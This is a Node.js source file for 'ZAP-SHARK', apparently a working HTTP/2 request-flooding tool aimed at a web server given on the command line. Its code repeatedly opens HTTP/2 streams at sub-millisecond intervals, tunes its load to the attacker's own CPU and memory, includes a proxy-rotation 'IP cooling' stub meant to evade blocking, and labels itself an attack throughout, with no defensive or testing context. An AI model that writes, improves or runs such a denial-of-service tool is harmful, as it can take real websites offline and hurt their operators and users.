const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_HYPERSONIC {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // SMART STREAM CONTROL
        this.streamWeights = {
            1: 80,   // 80% single stream
            2: 19,   // 19% double streams  
            5: 1     // 1% heavy (5 streams)
        };
        
        // RESOURCE MANAGEMENT
        this.performanceMode = true;
        this.maxActiveStreams = 50; // Prevent overload
        this.activeStreams = new Set();
        this.connectionPool = [];
        this.maxConnections = 2;
        
        // IP COOLING SYSTEM
        this.currentIPIndex = 0;
        this.proxyIPs = [];
        this.blockedIPs = new Set();
        
        // MAINTENANCE
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
        this.performanceMonitor = null;
    }

    // SMART STREAM SELECTOR
    getStreamCount() {
        const rand = Math.random() * 100;
        let cumulative = 0;
        
        for (const [streams, weight] of Object.entries(this.streamWeights)) {
            cumulative += weight;
            if (rand <= cumulative) {
                return parseInt(streams);
            }
        }
        return 1; // fallback
    }

    // OPTIMIZED CONNECTION
    async createOptimizedConnection() {
        return new Promise((resolve) => {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 2048, // Conservative memory
                    maxHeaderListPairs: 1000,
                    maxSendHeaderBlockLength: 32768
                });
                
                client.on('connect', () => {
                    this.connectionPool.push(client);
                    resolve(client);
                });
                
                client.on('error', () => {
                    setTimeout(() => this.createOptimizedConnection(), 100);
                });
                
                client.on('goaway', () => {
                    this.connectionPool = this.connectionPool.filter(c => c !== client);
                    setTimeout(() => this.createOptimizedConnection(), 100);
                });
                
            } catch (err) {
                setTimeout(() => this.createOptimizedConnection(), 100);
            }
        });
    }

    // EFFICIENT REQUEST SYSTEM
    async sendOptimizedRequest() {
        if (this.connectionPool.length === 0 || this.activeStreams.size >= this.maxActiveStreams) return;
        
        const connection = this.connectionPool[0];
        const streamCount = this.getStreamCount();
        
        for (let i = 0; i < streamCount; i++) {
            if (this.activeStreams.size >= this.maxActiveStreams) break;
            
            try {
                const streamId = Math.random().toString(36).substring(7);
                this.activeStreams.add(streamId);
                
                const req = connection.request({
                    ':method': 'GET',
                    ':path': '/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                });
                
                // MINIMAL EVENT HANDLERS FOR PERFORMANCE
                const cleanup = () => {
                    this.activeStreams.delete(streamId);
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    try { if (!req.destroyed) req.destroy(); } catch (err) {}
                };
                
                req.on('response', cleanup);
                req.on('error', cleanup);
                req.on('close', cleanup);
                
                req.end();
                
            } catch (err) {
                // SILENT FAIL - MAINTAIN RPS
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // PERFORMANCE MONITORING
    checkPerformance() {
        const cpuUsage = os.loadavg()[0] / os.cpus().length * 100;
        const memoryUsage = (os.totalmem() - os.freemem()) / os.totalmem() * 100;
        
        // ADAPTIVE STREAM LIMITING
        if (cpuUsage > 70 || memoryUsage > 75) {
            this.maxActiveStreams = Math.max(20, this.maxActiveStreams - 5);
        } else if (cpuUsage < 50 && memoryUsage < 60) {
            this.maxActiveStreams = Math.min(80, this.maxActiveStreams + 2);
        }
        
        return cpuUsage < 80 && memoryUsage < 85; // Keep below critical levels
    }

    // IP COOLING SYSTEM
    async handleIPCooling() {
        console.log('\n⚡ IP COOLING ACTIVATED');
        this.blockedIPs.add(this.currentIPIndex);
        
        this.currentIPIndex = (this.currentIPIndex + 1) % Math.max(this.proxyIPs.length, 1);
        
        setTimeout(() => {
            this.blockedIPs.delete(this.currentIPIndex);
        }, 600000);
    }

    // METRICS & DISPLAY
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const cpu = os.loadavg()[0].toFixed(1);
        const memory = ((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(1);
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
                           `CPU: ${cpu}% | MEM: ${memory}% | ` +
                           `STREAMS: ${this.activeStreams.size}/${this.maxActiveStreams}`);
    }

    // MAINTENANCE
    performMaintenance() {
        this.flushDNS();
        this.flushSockets();
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null', () => {});
        }
    }

    flushSockets() {
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.connectionPool = [];
        this.activeStreams.clear();
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n=== PERFORMANCE MAINTENANCE ===');
            this.status = "PAUSED";
            
            this.performMaintenance();
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
            }
            
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        console.log('\n=== MAINTENANCE COMPLETE - OPTIMIZED MODE ===');
        this.startOptimizedAttack();
    }

    // OPTIMIZED ATTACK CORE
    startOptimizedAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        // BALANCED INTERVAL FOR MAX RPS WITHOUT OVERLOAD
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING" && this.checkPerformance()) {
                // EFFICIENT REQUEST BURST
                for (let i = 0; i < 3; i++) {
                    this.sendOptimizedRequest();
                }
                this.updateDisplay();
            }
        }, 0.1);
    }

    async initialize() {
        console.log("=== ZAP-SHARK OPTIMIZED MODE ===");
        console.log("Stream Distribution: 80%x1 | 19%x2 | 1%x5");
        console.log("Focus: Maximum RPS + Stable Performance");
        console.log("Target:", this.targetUrl);
        console.log("=".repeat(50));
        
        // INITIALIZE CONNECTIONS
        for (let i = 0; i < this.maxConnections; i++) {
            await this.createOptimizedConnection();
        }
        
        this.startOptimizedAttack();
        
        // MAINTENANCE MONITOR
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // PERFORMANCE MONITOR
        this.performanceMonitor = setInterval(() => {
            this.checkPerformance();
        }, 2000);
        
        // CONNECTION HEALTH CHECK
        setInterval(() => {
            if (this.connectionPool.length < this.maxConnections && this.status === "ATTACKING") {
                this.createOptimizedConnection();
            }
        }, 3000);
        
        process.on('SIGINT', () => {
            this.stop();
        });
    }

    stop() {
        this.running = false;
        if (this.attackInterval) clearInterval(this.attackInterval);
        if (this.performanceMonitor) clearInterval(this.performanceMonitor);
        
        this.flushSockets();
        console.log('\n=== OPTIMIZED ATTACK TERMINATED ===');
        process.exit(0);
    }
}

// EXECUTION
const target = process.argv[2] || 'https://example.com';

if (!target.startsWith('https://')) {
    console.log('Error: HTTPS required for HTTP/2');
    console.log('Usage: node zap-shark-optimized.js https://your-target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_HYPERSONIC(target);
shark.initialize().catch(err => {
    console.log('Init failed:', err.message);
});
